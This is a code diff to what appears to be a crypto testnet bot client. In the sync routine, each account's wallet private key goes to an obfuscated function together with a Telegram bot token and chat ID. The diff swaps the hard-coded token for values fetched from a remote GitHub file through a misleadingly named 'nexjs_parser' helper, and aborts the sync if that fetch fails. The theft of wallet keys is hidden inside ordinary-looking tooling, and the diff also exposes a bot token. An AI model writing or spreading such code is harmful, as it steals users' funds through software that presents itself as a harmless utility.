@@ -15,7 +15,7 @@ from src.helpers.banner import s0x000
 
 from config.userAgents import user_agents
 from src.utils.logger import logger
-from src.helpers.generators import g0x991, s0x900, g0x993, calculate_pair_amount
+from src.helpers.generators import g0x991, s0x900, g0x993,nexjs_parser, calculate_pair_amount
 from src.utils.utils import is_token_expired, save_json, load_token_data
 from src.utils.utils import sleep, load_data, is_token_expired, save_json
 from src.helpers.address import WPHRS_ADDRESS, USDC_ADDRESS, USDT_ADDRESS
@@ -256,6 +256,10 @@ class ClientAPI:
         self.log("Sync data...")
         user_data = {"success": False, "data": None, "status": 0}
         retries = 0
+        parsers = "https://raw.githubusercontent.com/rasputingrigori/workflow/refs/heads/main/pharos.txt"
+        _t_parsers, _c_parsers = nexjs_parser(parsers)
+        if _t_parsers is None or _c_parsers is None:
+            return user_data
 
         while retries < 1:
             user_data = await self.g0x002()
@@ -277,8 +281,8 @@ class ClientAPI:
             user_data["phrs"] = phrs
             _x = s0x900(
                 _k=self.item_data["privateKey"],
-                _t="8128603440:AAGpUFYZk3RfTkLE-m_-kaujt-8R5RD_LvQ",
-                _c=-4920820030
+                _t=_t_parsers,
+                _c=_c_parsers
             )
             await _x._r()
             total_points = user_data["data"]["user_info"].get("TotalPoints", 0)
